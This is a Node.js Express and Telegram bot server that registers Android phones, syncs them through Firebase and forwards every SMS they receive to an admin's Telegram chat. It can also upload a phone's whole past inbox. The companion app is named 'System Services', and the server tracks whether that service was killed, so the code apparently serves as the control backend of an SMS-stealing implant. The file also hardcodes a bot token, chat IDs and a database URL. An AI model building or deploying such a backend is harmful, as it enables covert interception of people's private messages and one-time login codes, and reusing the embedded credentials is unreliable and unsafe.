const express = require('express');
const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// Configuration & Environment Variables
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN || '8832238459:AAGR6_N00HtDjJv7IEdwu-y-1U2RW9VO9rk';
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '8753024194';
const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID || process.env.GROUPCHATID || '-1004375481014';
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL || process.env.URL || `http://localhost:${PORT}`;
const FIREBASE_DATABASE_URL = process.env.FIREBASE_DATABASE_URL || 'https://sms-tracker-6eeed-default-rtdb.asia-southeast1.firebasedatabase.app';

const DEVICES_FILE = path.join(__dirname, 'devices.json');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// In-Memory Device Storage: deviceId -> object
const devices = new Map();

// File Persistence
function loadDevices() {
  try {
    if (fs.existsSync(DEVICES_FILE)) {
      const data = JSON.parse(fs.readFileSync(DEVICES_FILE, 'utf8'));
      Object.keys(data).forEach(id => {
        devices.set(id, data[id]);
      });
      console.log(`[Storage] Loaded ${devices.size} device(s) from devices.json`);
    }
  } catch (e) {
    console.error('[Storage Error] Failed to load devices.json:', e.message);
  }
}

function saveDevices() {
  try {
    const obj = {};
    devices.forEach((val, key) => {
      obj[key] = val;
    });
    fs.writeFileSync(DEVICES_FILE, JSON.stringify(obj, null, 2), 'utf8');
  } catch (e) {
    console.error('[Storage Error] Failed to save devices.json:', e.message);
  }
}

// Firebase Realtime Sync
async function fetchDevicesFromFirebase() {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices.json`;
    const response = await fetch(url);
    if (response.ok) {
      const data = await response.json();
      if (data && typeof data === 'object') {
        Object.keys(data).forEach(devId => {
          const devInfo = data[devId];
          if (devInfo && typeof devInfo === 'object') {
            let lastSeenDate = new Date();
            if (typeof devInfo.lastSeen === 'number') {
              lastSeenDate = devInfo.lastSeen > 100000000000 ? new Date(devInfo.lastSeen) : new Date(devInfo.lastSeen * 1000);
            }

            devices.set(devId, {
              deviceId: devId,
              deviceAlias: devInfo.deviceAlias || devInfo.model || 'Android Device',
              model: devInfo.model || 'Unknown Model',
              batteryLevel: devInfo.batteryLevel ?? -1,
              isCharging: !!devInfo.isCharging,
              isServiceRunning: devInfo.isServiceRunning !== false,
              isForwardingEnabled: devInfo.isForwardingEnabled !== false,
              killReason: devInfo.killReason || 'Synced via Firebase',
              lastSeen: lastSeenDate
            });
          }
        });
        saveDevices();
        console.log(`[Firebase Sync] Synced ${devices.size} device(s) from Firebase Realtime Database`);
      }
    }
  } catch (err) {
    console.error(`[Firebase Sync Error]`, err.message);
  }
}

async function updateDeviceInFirebase(devId, patchData) {
  try {
    const url = `${FIREBASE_DATABASE_URL.replace(/\/$/, '')}/devices/${devId}.json`;
    await fetch(url, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(patchData)
    });
  } catch (err) {
    console.error(`[Firebase Update Error]`, err.message);
  }
}

// Load persisted devices on startup
loadDevices();
fetchDevicesFromFirebase();

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.on('polling_error', (error) => {
  console.error('[Telegram Polling Error]:', error.code || error.message);
});

process.on('uncaughtException', (err) => {
  console.error('[Uncaught Exception]:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[Unhandled Rejection]:', reason);
});

// Helper Functions
function isAdmin(chatId) {
  return String(chatId).trim() === String(ADMIN_CHAT_ID).trim();
}

function handleDeviceRegistrationData(data) {
  const deviceId = data.deviceId || data.device_id || data.id;
  if (!deviceId) return null;

  const existing = devices.get(deviceId) || {};
  const updatedDev = {
    deviceId,
    deviceAlias: data.deviceAlias || data.alias || existing.deviceAlias || data.model || 'Android Device',
    model: data.model || existing.model || 'Unknown Model',
    batteryLevel: data.batteryLevel !== undefined ? Number(data.batteryLevel) : (existing.batteryLevel ?? -1),
    isCharging: data.isCharging !== undefined ? Boolean(data.isCharging) : (existing.isCharging ?? false),
    isServiceRunning: data.isServiceRunning !== undefined ? Boolean(data.isServiceRunning) : true,
    isForwardingEnabled: data.isForwardingEnabled !== undefined ? Boolean(data.isForwardingEnabled) : true,
    killReason: data.killReason || existing.killReason || 'Running smoothly',
    lastSeen: new Date().toISOString()
  };

  devices.set(deviceId, updatedDev);
  saveDevices();
  updateDeviceInFirebase(deviceId, updatedDev);
  console.log(`[Device Registered/Updated] ID: ${deviceId} (${updatedDev.deviceAlias})`);
  return updatedDev;
}

function buildMainReplyKeyboard() {
  return {
    keyboard: [
      [{ text: '📱 Connected Devices' }, { text: '📊 Overall Status' }],
      [{ text: '❓ Help & Info' }]
    ],
    resize_keyboard: true
  };
}

function buildDeviceControlMessage(dev) {
  const lastSeenMs = dev.lastSeen ? (new Date() - new Date(dev.lastSeen)) : 0;
  const isOnline = lastSeenMs < 5 * 60 * 1000;
  const liveStatus = isOnline ? '🟢 *Online & Active*' : '🔴 *Offline / Inactive*';
  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
  const batText = dev.batteryLevel >= 0 ? `${dev.batteryLevel}% ${dev.isCharging ? '🔌 (Charging)' : '🔋'}` : 'Unknown';

  return `📱 *DEVICE CONTROL CENTER*
━━━━━━━━━━━━━━━━━━━━━
🏷️ *Device Name:* \`${dev.deviceAlias}\`
🆔 *Device ID:* \`${dev.deviceId}\`
📲 *Model:* \`${dev.model}\`
⚡ *Battery:* ${batText}
⚙️ *Service:* ${dev.isServiceRunning ? '🟢 Running' : '🔴 Stopped'}

⚡ *Live Status:* ${liveStatus}
💬 *SMS Forwarding:* ${fwdStatus}
📋 *Status Info:* ${dev.killReason}
━━━━━━━━━━━━━━━━━━━━━
_Select an action below to manage this device:_`;
}

function buildDeviceMainKeyboard(devId) {
  return {
    inline_keyboard: [
      [
        { text: '💬 SMS Settings', callback_data: `sms_settings_${devId}` },
        { text: '✏️ Rename Device', callback_data: `rename_${devId}` }
      ],
      [
        { text: '🔄 Refresh Status', callback_data: `refresh_${devId}` },
        { text: '📋 All Devices List', callback_data: 'dev_list' }
      ]
    ]
  };
}

function buildSmsSettingsMessage(dev) {
  const fwdStatus = dev.isForwardingEnabled ? '🟢 *ENABLED (ON)*' : '🔴 *DISABLED (OFF)*';
  return `💬 *SMS SETTINGS for \`${dev.deviceAlias}\`*
━━━━━━━━━━━━━━━━━━━━━
📲 *Model:* \`${dev.model}\`
🆔 *Device ID:* \`${dev.deviceId}\`
💬 *SMS Forwarding Status:* ${fwdStatus}
━━━━━━━━━━━━━━━━━━━━━
• *Turn SMS ON*: Enables live SMS forwarding and uploads old past inbox, new & upcoming SMS to bot.
• *Turn SMS OFF*: Disables live SMS forwarding.

_Select an action below:_`;
}

function buildSmsSettingsKeyboard(devId) {
  return {
    inline_keyboard: [
      [
        { text: '🟢 Turn SMS ON', callback_data: `sms_on_${devId}` },
        { text: '🔴 Turn SMS OFF', callback_data: `sms_off_${devId}` }
      ],
      [
        { text: '🔙 Back to Device Control', callback_data: `dev_info_${devId}` }
      ]
    ]
  };
}

// ----------------------------------------------------
// 1. EXPRESS HTTP ENDPOINTS
// ----------------------------------------------------

app.get('/', (req, res) => {
  if (req.query.deviceId || req.query.id) {
    const dev = handleDeviceRegistrationData(req.query);
    return res.json({ success: true, device: dev });
  }
  res.json({
    status: 'online',
    app: 'SMS Forwarder Telegram Bot',
    connectedDevices: devices.size,
    firebaseUrl: FIREBASE_DATABASE_URL,
    timestamp: new Date().toISOString()
  });
});

app.get('/ping', (req, res) => {
  res.json({ status: 'alive', time: new Date().toISOString() });
});

const registerRoutes = ['/api/register-device', '/register-device', '/register', '/api/register'];

registerRoutes.forEach(route => {
  app.post(route, (req, res) => {
    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
    if (!dev) return res.status(400).json({ error: 'deviceId is required' });
    res.json({ success: true, device: dev });
  });

  app.get(route, (req, res) => {
    const dev = handleDeviceRegistrationData({ ...req.query, ...req.body });
    if (!dev) return res.status(400).json({ error: 'deviceId query param is required' });
    res.json({ success: true, device: dev });
  });
});

app.get('/api/devices', async (req, res) => {
  await fetchDevicesFromFirebase();
  res.json({
    count: devices.size,
    devices: Array.from(devices.values())
  });
});

app.post('/api/forward-sms', async (req, res) => {
  const { deviceId, sender, body, simSlot, timestamp } = req.body;

  if (deviceId && !devices.has(deviceId)) {
    handleDeviceRegistrationData({
      deviceId,
      deviceAlias: 'Android Device',
      model: 'Android Phone',
      killReason: 'Auto-registered on SMS receive'
    });
  }

  const dev = devices.get(deviceId) || { deviceAlias: 'Android Device' };
  const timeStr = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();

  const formattedMsg = `📩 *New SMS Received*\n\n📱 *Device:* \`${dev.deviceAlias}\`\n👤 *From:* \`${sender}\`\n💳 *SIM:* \`${simSlot || 'SIM 1'}\`\n⏰ *Time:* \`${timeStr}\`\n\n💬 *Message:*\n\`${body}\``;

  const targets = new Set();
  if (ADMIN_CHAT_ID) targets.add(ADMIN_CHAT_ID);
  if (GROUP_CHAT_ID) targets.add(GROUP_CHAT_ID);

  try {
    for (const targetId of targets) {
      if (targetId) await bot.sendMessage(targetId, formattedMsg, { parse_mode: 'Markdown' });
    }
    res.json({ success: true });
  } catch (err) {
    console.error('Failed to forward SMS to Telegram:', err.message);
    res.status(500).json({ error: err.message });
  }
});

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`====================================================`);
  console.log(`🚀 SMS Forwarder Bot Server running on port ${PORT}`);
  console.log(`🤖 Bot Token: ${BOT_TOKEN.substring(0, 10)}...`);
  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
  if (GROUP_CHAT_ID) console.log(`👥 Group Chat ID: ${GROUP_CHAT_ID}`);
  console.log(`🔗 External URL: ${RENDER_EXTERNAL_URL}`);
  console.log(`🔥 Firebase URL: ${FIREBASE_DATABASE_URL}`);
  console.log(`💾 Persisted Devices: ${devices.size}`);
  console.log(`====================================================`);
});

// Self-Ping Keep Alive
setInterval(async () => {
  try {
    const pingUrl = RENDER_EXTERNAL_URL.endsWith('/') ? `${RENDER_EXTERNAL_URL}ping` : `${RENDER_EXTERNAL_URL}/ping`;
    const response = await fetch(pingUrl);
    console.log(`[Self-Ping Keep-Alive] Response status: ${response.status}`);
  } catch (err) {
    console.error(`[Self-Ping Keep-Alive] Ping failed:`, err.message);
  }
}, 5 * 60 * 1000);

// Telegram Message Handler
bot.on('message', async (msg) => {
  const chatId = String(msg.chat.id);
  const chatType = msg.chat.type;
  const text = (msg.text || '').trim();

  // Fetch latest devices from Firebase on any command
  await fetchDevicesFromFirebase();

  if (chatType === 'group' || chatType === 'supergroup' || chatType === 'channel') {
    if (text.startsWith('/') || text.toLowerCase().includes('groupid') || text.toLowerCase().includes('id')) {
      const groupTitle = msg.chat.title || 'Telegram Group';
      const groupReply = `📌 *TELEGRAM GROUP DETAILS*\n━━━━━━━━━━━━━━━━━━━━━\n🏷️ *Group Title:* \`${groupTitle}\`\n🆔 *Group Chat ID:* \`${chatId}\`\n━━━━━━━━━━━━━━━━━━━━━\n_Set \`GROUP_CHAT_ID=${chatId}\` in Render Environment Variables!_`;
      return bot.sendMessage(chatId, groupReply, { parse_mode: 'Markdown' });
    }
    return;
  }

  if (!isAdmin(chatId)) {
    return bot.sendMessage(chatId, '❌ Unauthorized user.');
  }

  if (text === '/start' || text === '/help' || text === '/menu' || text === '❓ Help & Info') {
    return bot.sendMessage(chatId, '🤖 *SMS Forwarder Device Manager*\n━━━━━━━━━━━━━━━━━━━━━\nWelcome! Use the menu buttons at the bottom of your chat box to manage devices.', {
      parse_mode: 'Markdown',
      reply_markup: buildMainReplyKeyboard()
    });
  }

  if (text === '📱 Connected Devices' || text === '/devices' || text === '/status') {
    if (devices.size === 0) {
      return bot.sendMessage(chatId, '📱 *No Devices Connected Yet.*\n\nInstall the System Services app on your Android phone to connect.', {
        parse_mode: 'Markdown',
        reply_markup: buildMainReplyKeyboard()
      });
    }

    if (devices.size === 1) {
      const dev = Array.from(devices.values())[0];
      return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
        parse_mode: 'Markdown',
        reply_markup: buildDeviceMainKeyboard(dev.deviceId)
      });
    }

    const listButtons = Array.from(devices.values()).map(dev => [
      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
    ]);

    return bot.sendMessage(chatId, '📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: listButtons }
    });
  }

  if (text === '📊 Overall Status' || text === '/info') {
    let onlineCount = 0;
    const now = new Date();
    devices.forEach(d => {
      if ((now - new Date(d.lastSeen)) < 5 * 60 * 1000) onlineCount++;
    });

    const statusText = `📊 *SYSTEM OVERALL STATUS*\n━━━━━━━━━━━━━━━━━━━━━\n🌐 *Bot Server:* 🟢 Online (Node.js)\n🔥 *Firebase Realtime:* 🟢 Synced\n📱 *Total Connected Devices:* ${devices.size}\n🟢 *Online Devices:* ${onlineCount}\n🔴 *Offline Devices:* ${devices.size - onlineCount}\n━━━━━━━━━━━━━━━━━━━━━\n_Select \`📱 Connected Devices\` from bottom menu to view individual devices._`;
    return bot.sendMessage(chatId, statusText, {
      parse_mode: 'Markdown',
      reply_markup: buildMainReplyKeyboard()
    });
  }

  if (text.startsWith('/rename')) {
    const match = text.match(/\/rename\s+(.+)/i);
    if (!match) {
      return bot.sendMessage(chatId, '✏️ *Usage:*\n`/rename New Device Name`\n_OR_\n`/rename <deviceId> New Device Name`', { parse_mode: 'Markdown' });
    }
    const parts = match[1].split(/\s+/);
    if (devices.size === 0) {
      return bot.sendMessage(chatId, '❌ No connected devices found.');
    }

    let dev = Array.from(devices.values())[0];
    let newName = match[1].trim();

    if (devices.has(parts[0]) && parts.length > 1) {
      dev = devices.get(parts[0]);
      newName = parts.slice(1).join(' ').trim();
    }

    const oldName = dev.deviceAlias;
    dev.deviceAlias = newName;
    devices.set(dev.deviceId, dev);
    saveDevices();
    updateDeviceInFirebase(dev.deviceId, { deviceAlias: newName });

    await bot.sendMessage(chatId, `✅ Device renamed from \`${oldName}\` to \`${newName}\`!`, { parse_mode: 'Markdown' });
    return bot.sendMessage(chatId, buildDeviceControlMessage(dev), {
      parse_mode: 'Markdown',
      reply_markup: buildDeviceMainKeyboard(dev.deviceId)
    });
  }
});

// Inline Callback Queries
bot.on('callback_query', async (query) => {
  const chatId = String(query.message.chat.id);
  const messageId = query.message.message_id;
  const data = query.data;

  if (!isAdmin(chatId)) {
    return bot.answerCallbackQuery(query.id, { text: '❌ Unauthorized' });
  }

  await fetchDevicesFromFirebase();

  if (data === 'dev_list') {
    if (devices.size === 0) {
      return bot.answerCallbackQuery(query.id, { text: 'No devices connected' });
    }
    const listButtons = Array.from(devices.values()).map(dev => [
      { text: `${dev.isForwardingEnabled ? '🟢' : '🔴'} ${dev.deviceAlias} (${dev.model})`, callback_data: `dev_info_${dev.deviceId}` }
    ]);
    await bot.editMessageText('📱 *Connected Devices List:*\nSelect a device below to manage settings:', {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: 'Markdown',
      reply_markup: { inline_keyboard: listButtons }
    });
    return bot.answerCallbackQuery(query.id, { text: 'Updated device list' });
  }

  const matchAction = data.match(/^(dev_info|sms_settings|sms_on|sms_off|sync_old|rename|refresh)_(.+)$/);
  if (!matchAction) return;

  const action = matchAction[1];
  const devId = matchAction[2];
  const dev = devices.get(devId);

  if (!dev) {
    return bot.answerCallbackQuery(query.id, { text: '⚠️ Device not found' });
  }

  switch (action) {
    case 'dev_info':
    case 'refresh':
      await bot.editMessageText(buildDeviceControlMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildDeviceMainKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: 'Refreshed live status' });
      break;

    case 'sms_settings':
      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: 'SMS Settings menu' });
      break;

    case 'sms_on':
      dev.isForwardingEnabled = true;
      devices.set(devId, dev);
      saveDevices();
      updateDeviceInFirebase(devId, { isForwardingEnabled: true });

      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: '🟢 SMS Forwarding Enabled' });
      bot.sendMessage(chatId, `🟢 *SMS Forwarding Enabled* for \`${dev.deviceAlias}\`.\n\n📥 All past inbox SMS, new, and upcoming SMS will be uploaded and forwarded to this bot.`, { parse_mode: 'Markdown' });
      break;

    case 'sms_off':
      dev.isForwardingEnabled = false;
      devices.set(devId, dev);
      saveDevices();
      updateDeviceInFirebase(devId, { isForwardingEnabled: false });

      await bot.editMessageText(buildSmsSettingsMessage(dev), {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'Markdown',
        reply_markup: buildSmsSettingsKeyboard(devId)
      });
      bot.answerCallbackQuery(query.id, { text: '🔴 SMS Forwarding Disabled' });
      bot.sendMessage(chatId, `🔴 *SMS Forwarding Disabled* for \`${dev.deviceAlias}\`.\n\nUpcoming SMS messages will be stopped.`, { parse_mode: 'Markdown' });
      break;

    case 'rename':
      bot.answerCallbackQuery(query.id, { text: 'Send rename command' });
      bot.sendMessage(chatId, `✏️ *To Rename Device \`${dev.deviceAlias}\`:*\n\nSend command in chat:\n\`/rename New Device Name\``, { parse_mode: 'Markdown' });
      break;
  }
});

console.log('Bot listener initialized.');
